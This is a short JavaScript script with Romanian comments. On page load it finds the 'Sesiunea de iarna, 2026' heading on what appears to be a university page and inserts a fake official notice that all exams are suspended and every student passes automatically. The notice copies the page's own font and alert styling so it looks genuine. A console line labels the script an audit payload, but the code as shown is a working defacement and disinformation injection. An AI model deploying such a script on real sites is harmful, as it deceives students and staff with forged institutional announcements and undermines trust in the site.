window.addEventListener('load', () => {
    
    // 1. Țintim DOAR elementele <strong>
    const strongTags = document.querySelectorAll('strong');
    let targetElement = null;

    for (let el of strongTags) {
        if (el.textContent.trim() === 'Sesiunea de iarna, 2026') {
            // Am găsit inima elementului! 
            // Ne mutăm la părintele <p> pentru a insera block-ul, sub el.
            targetElement = el.closest('p') || el;
            break; 
        }
    }

    // 2. Inserarea Seamless
    if (targetElement) {
        const fakeAnnouncement = document.createElement('div');
        fakeAnnouncement.innerHTML = "<strong>Notificare Importantă:</strong> Toate examenele au fost suspendate. Toți studenții sunt promovați din oficiu.";

        // Furtul de Identitate Vizuală (CSS Hijacking)
        const nativeFont = window.getComputedStyle(targetElement).fontFamily;
        
        fakeAnnouncement.style.fontFamily = nativeFont;
        fakeAnnouncement.style.color = "#856404"; 
        fakeAnnouncement.style.backgroundColor = "#fff3cd"; 
        fakeAnnouncement.style.border = "1px solid #ffeeba";
        fakeAnnouncement.style.padding = "12px 15px";
        fakeAnnouncement.style.marginTop = "20px";
        fakeAnnouncement.style.marginBottom = "20px";
        fakeAnnouncement.style.borderRadius = "4px";
        fakeAnnouncement.style.fontSize = "16px";
        fakeAnnouncement.style.boxShadow = "0 2px 4px rgba(0,0,0,0.05)";
        fakeAnnouncement.style.textAlign = "center"; 

        // 3. Injectarea finală
        targetElement.insertAdjacentElement('afterend', fakeAnnouncement);
        
        console.log("[Audit] DOM alterat cu succes. Payload inserat la locația exactă.");
    }
});